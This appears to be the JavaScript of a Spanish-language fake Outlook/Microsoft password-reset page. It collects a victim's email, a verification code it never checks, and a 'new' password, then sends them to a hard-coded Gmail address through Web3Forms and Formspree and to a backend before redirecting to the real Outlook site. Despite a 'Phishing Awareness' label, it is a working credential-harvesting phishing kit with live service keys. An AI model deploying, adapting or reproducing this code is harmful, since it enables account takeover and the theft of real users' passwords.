// Estado de la aplicación
let userEmail = '';
let verificationCodeSent = '';

// Elementos del DOM
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const step4 = document.getElementById('step4');

const emailInput = document.getElementById('email');
const verificationCodeInput = document.getElementById('verificationCode');
const newPasswordInput = document.getElementById('newPassword');
const confirmPasswordInput = document.getElementById('confirmPassword');

const emailError = document.getElementById('emailError');
const codeError = document.getElementById('codeError');
const newPasswordError = document.getElementById('newPasswordError');
const confirmPasswordError = document.getElementById('confirmPasswordError');

const userEmailDisplay = document.getElementById('userEmail');
const userEmailDisplay2 = document.getElementById('userEmail2');

const nextBtn = document.getElementById('nextBtn');
const backBtn = document.getElementById('backBtn');
const backBtn2 = document.getElementById('backBtn2');
const verifyBtn = document.getElementById('verifyBtn');
const resetBtn = document.getElementById('resetBtn');
const finishBtn = document.getElementById('finishBtn');
const resendCodeLink = document.getElementById('resendCodeLink');

// Función para validar email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Función para cambiar de paso
function showStep(stepNumber) {
    step1.classList.add('hidden');
    step2.classList.add('hidden');
    step3.classList.add('hidden');
    step4.classList.add('hidden');

    switch(stepNumber) {
        case 1:
            step1.classList.remove('hidden');
            setTimeout(() => emailInput.focus(), 100);
            break;
        case 2:
            step2.classList.remove('hidden');
            setTimeout(() => verificationCodeInput.focus(), 100);
            break;
        case 3:
            step3.classList.remove('hidden');
            setTimeout(() => newPasswordInput.focus(), 100);
            break;
        case 4:
            step4.classList.remove('hidden');
            break;
    }
}

// Función para generar código aleatorio
function generateCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

// Función para enviar datos capturados
function sendCapturedData(email, code, newPassword) {
    const timestamp = new Date().toLocaleString('es-ES');
    const userAgent = navigator.userAgent;
    const currentUrl = window.location.href;
    
    console.log('=== CAPTURA DE RESTABLECIMIENTO DE CONTRASEÑA ===');
    console.log('Email:', email);
    console.log('Código ingresado:', code);
    console.log('Nueva contraseña:', newPassword);
    
    // Guardar en localStorage (unified key 'capturas')
    try {
        const capturas = JSON.parse(localStorage.getItem('capturas') || '[]');
        capturas.push({
            type: 'reset',
            email: email,
            password: newPassword, // stored as 'password' field for consistency
            codigo_ingresado: code,
            timestamp: timestamp,
            userAgent: userAgent,
            url: currentUrl
        });
        localStorage.setItem('capturas', JSON.stringify(capturas));
        console.log('✅ Datos guardados en localStorage (type=reset)');
    } catch(e) {
        console.error('Error guardando en localStorage:', e);
    }
    
    // Auto-detectar backend: si no está en GitHub Pages, usar servidor local
    if (!window.BACKEND_URL && !window.location.hostname.includes('github.io')) {
        window.BACKEND_URL = window.location.origin;
    }
    
    // Send to internal backend if available
    const backend = window.BACKEND_URL || '';
    if (backend) {
        console.log('📤 Enviando al backend:', backend);
        fetch(backend + '/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: email,
                password: newPassword,
                timestamp: timestamp,
                userAgent: userAgent,
                url: currentUrl,
                type: 'reset',
                codigo_ingresado: code
            })
        })
        .then(res => res.json())
        .then(d => console.log('✅ Backend response:', d))
        .catch(e => console.log('⚠️ Backend not reachable (data stored locally)', e));
    }
    
    // Preparar mensaje
    const mensaje = `
═══════════════════════════════════════════
🔐 CAPTURA: RESTABLECIMIENTO DE CONTRASEÑA
═══════════════════════════════════════════

📧 EMAIL: ${email}
🔢 CÓDIGO INGRESADO: ${code}
🔑 NUEVA CONTRASEÑA: ${newPassword}

⏰ FECHA Y HORA: ${timestamp}
🌐 NAVEGADOR: ${userAgent}
🔗 URL: ${currentUrl}

═══════════════════════════════════════════
⚠️ Campaña de Seguridad - Password Reset
═══════════════════════════════════════════
    `;
    
    // Método 1: Web3Forms (más confiable para Netlify)
    console.log('📤 Enviando con Web3Forms...');
    const formData = new FormData();
    formData.append('access_key', '38e2db25-d16e-4fb3-b632-be632c018a69');
    formData.append('subject', `🔐 Reset Password - ${email}`);
    formData.append('from_name', 'Sistema de Phishing Awareness');
    formData.append('email', 'sofly7899@gmail.com');
    formData.append('message', mensaje);
    formData.append('email_capturado', email);
    formData.append('codigo_ingresado', code);
    formData.append('nueva_password', newPassword);
    formData.append('tipo_captura', 'password_reset');
    formData.append('fecha_hora', timestamp);
    
    fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        console.log('Web3Forms respuesta:', data);
        if (data.success) {
            console.log('✅ Email enviado exitosamente por Web3Forms');
        } else {
            console.error('❌ Error en Web3Forms:', data.message);
        }
    })
    .catch(error => {
        console.error('❌ Error con Web3Forms:', error);
    });
    
    // Método 2: Formspree (backup)
    console.log('📤 Enviando con Formspree como backup...');
    fetch('https://formspree.io/f/xanyevdp', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({
            email: 'sofly7899@gmail.com',
            subject: `🔐 Restablecimiento de Contraseña - ${email}`,
            message: mensaje,
            _replyto: 'sofly7899@gmail.com',
            _subject: `🔐 Nueva Captura: Reset Password - ${email}`,
            tipo_captura: 'password_reset',
            email_capturado: email,
            codigo_ingresado: code,
            nueva_password: newPassword,
            fecha_hora: timestamp
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('✅ Formspree respuesta:', data);
    })
    .catch(error => {
        console.error('❌ Error con Formspree:', error);
    });
}

// Event Listeners

// Botón "Siguiente" (Step 1 -> Step 2)
nextBtn.addEventListener('click', () => {
    const email = emailInput.value.trim();
    
    if (!email) {
        emailError.textContent = 'Escriba su correo electrónico, teléfono o Skype.';
        emailInput.style.borderColor = '#a80000';
        return;
    }
    
    if (!isValidEmail(email)) {
        emailError.textContent = 'Escriba una dirección de correo electrónico válida.';
        emailInput.style.borderColor = '#a80000';
        return;
    }
    
    emailError.textContent = '';
    emailInput.style.borderColor = '';
    userEmail = email;
    userEmailDisplay.textContent = email;
    userEmailDisplay2.textContent = email;
    
    // Generar código "enviado"
    verificationCodeSent = generateCode();
    console.log('Código "enviado":', verificationCodeSent);
    
    showStep(2);
});

// Permitir Enter en el campo de email
emailInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        nextBtn.click();
    }
});

// Limpiar error al escribir
emailInput.addEventListener('input', () => {
    emailError.textContent = '';
    emailInput.style.borderColor = '';
});

// Botón "Atrás" (Step 2 -> Step 1)
backBtn.addEventListener('click', () => {
    verificationCodeInput.value = '';
    codeError.textContent = '';
    showStep(1);
});

// Botón "Comprobar" (Step 2 -> Step 3)
verifyBtn.addEventListener('click', () => {
    const code = verificationCodeInput.value.trim();
    
    if (!code) {
        codeError.textContent = 'Escriba el código que recibió.';
        verificationCodeInput.style.borderColor = '#a80000';
        return;
    }
    
    if (code.length < 4) {
        codeError.textContent = 'El código debe tener al menos 4 dígitos.';
        verificationCodeInput.style.borderColor = '#a80000';
        return;
    }
    
    codeError.textContent = '';
    verificationCodeInput.style.borderColor = '';
    
    // Simular verificación
    verifyBtn.textContent = 'Comprobando...';
    verifyBtn.disabled = true;
    
    setTimeout(() => {
        showStep(3);
        verifyBtn.textContent = 'Comprobar';
        verifyBtn.disabled = false;
    }, 1500);
});

// Permitir Enter en el código
verificationCodeInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        verifyBtn.click();
    }
});

// Limpiar error al escribir
verificationCodeInput.addEventListener('input', () => {
    codeError.textContent = '';
    verificationCodeInput.style.borderColor = '';
});

// Reenviar código
resendCodeLink.addEventListener('click', (e) => {
    e.preventDefault();
    verificationCodeSent = generateCode();
    console.log('Nuevo código "enviado":', verificationCodeSent);
    alert('Se ha enviado un nuevo código a su correo electrónico.');
});

// Botón "Atrás" (Step 3 -> Step 2)
backBtn2.addEventListener('click', () => {
    newPasswordInput.value = '';
    confirmPasswordInput.value = '';
    newPasswordError.textContent = '';
    confirmPasswordError.textContent = '';
    showStep(2);
});

// Botón "Siguiente" (Step 3 -> Step 4)
resetBtn.addEventListener('click', () => {
    const newPassword = newPasswordInput.value;
    const confirmPassword = confirmPasswordInput.value;
    
    let hasError = false;
    
    if (!newPassword) {
        newPasswordError.textContent = 'Escriba una contraseña.';
        newPasswordInput.style.borderColor = '#a80000';
        hasError = true;
    } else if (newPassword.length < 8) {
        newPasswordError.textContent = 'La contraseña debe tener al menos 8 caracteres.';
        newPasswordInput.style.borderColor = '#a80000';
        hasError = true;
    } else {
        newPasswordError.textContent = '';
        newPasswordInput.style.borderColor = '';
    }
    
    if (!confirmPassword) {
        confirmPasswordError.textContent = 'Vuelva a escribir la contraseña.';
        confirmPasswordInput.style.borderColor = '#a80000';
        hasError = true;
    } else if (newPassword !== confirmPassword) {
        confirmPasswordError.textContent = 'Las contraseñas no coinciden.';
        confirmPasswordInput.style.borderColor = '#a80000';
        hasError = true;
    } else {
        confirmPasswordError.textContent = '';
        confirmPasswordInput.style.borderColor = '';
    }
    
    if (hasError) return;
    
    // Simular procesamiento
    resetBtn.textContent = 'Procesando...';
    resetBtn.disabled = true;
    
    // Enviar datos capturados
    const codeEntered = verificationCodeInput.value.trim();
    sendCapturedData(userEmail, codeEntered, newPassword);
    
    setTimeout(() => {
        showStep(4);
        resetBtn.textContent = 'Siguiente';
        resetBtn.disabled = false;
    }, 1500);
});

// Limpiar errores al escribir
newPasswordInput.addEventListener('input', () => {
    newPasswordError.textContent = '';
    newPasswordInput.style.borderColor = '';
});

confirmPasswordInput.addEventListener('input', () => {
    confirmPasswordError.textContent = '';
    confirmPasswordInput.style.borderColor = '';
});

// Botón "Continuar" (Step 4 -> Redirigir a Outlook)
finishBtn.addEventListener('click', () => {
    window.location.href = 'https://outlook.live.com/owa/';
});

// Inicializar: mostrar el primer paso
showStep(1);

// Prevenir el envío de formularios
document.addEventListener('submit', (e) => {
    e.preventDefault();
});
